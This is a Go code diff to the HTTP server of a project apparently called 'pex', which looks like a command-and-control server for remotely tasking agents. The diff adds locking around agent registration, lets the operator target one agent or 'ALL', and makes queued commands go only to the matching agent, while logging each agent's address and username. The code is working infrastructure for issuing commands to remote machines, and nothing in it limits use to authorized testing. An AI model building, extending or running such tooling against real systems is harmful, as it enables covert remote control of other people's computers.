@@ -14,9 +14,7 @@ import (
 	"github.com/hardal7/pex/internal/config"
 )
 
-func Serve() {
-	go GetCommands()
-
+func ServeHTTP() {
 	root := http.NewServeMux()
 	root.Handle("/", http.HandlerFunc(requestHandler()))
 
@@ -31,27 +29,16 @@ func Serve() {
 	}
 }
 
-type Task struct {
-	Agent   string
-	Command string
-}
-
-type ServerState struct {
-	RegisteredAgents []string
-	SelectedAgent    string
-	Tasks            []Task
-}
-
-var state ServerState = ServerState{SelectedAgent: "None"}
-
 func requestHandler() http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		if r.Header.Get("Register") == "true" {
 			uuid, _ := uuid.NewRandom()
 			w.Write([]byte(uuid.String()))
+			mu.Lock()
 			state.RegisteredAgents = append(state.RegisteredAgents, uuid.String())
+			mu.Unlock()
 			slog.Info("Registered agent: " + r.RemoteAddr + " with UUID: " + uuid.String())
-		} else if r.Header.Get("UUID") != state.SelectedAgent {
+		} else if r.Header.Get("UUID") == state.SelectedAgent || "ALL" == state.SelectedAgent {
 			slog.Info("Connected Agent: \n")
 			slog.Info("Address: " + r.RemoteAddr)
 			slog.Info("Username: " + r.Header.Get("Username"))
@@ -82,7 +69,7 @@ func requestHandler() http.HandlerFunc {
 					go InitiateSession()
 					state.Tasks = state.Tasks[1:]
 				}
-				requestCommand(w)
+				requestCommand(w, r)
 			}
 		} else {
 			w.Write([]byte(""))
@@ -91,9 +78,9 @@ func requestHandler() http.HandlerFunc {
 	}
 }
 
-func requestCommand(w http.ResponseWriter) {
+func requestCommand(w http.ResponseWriter, r *http.Request) {
 	if len(state.Tasks) != 0 {
-		if state.Tasks[0].Command != "" {
+		if state.Tasks[0].Command != "" && state.Tasks[0].Agent == r.Header.Get("UUID") {
 			w.Write([]byte(state.Tasks[0].Command))
 			slog.Info("Command requested: " + state.Tasks[0].Command)
 			state.Tasks = state.Tasks[1:]
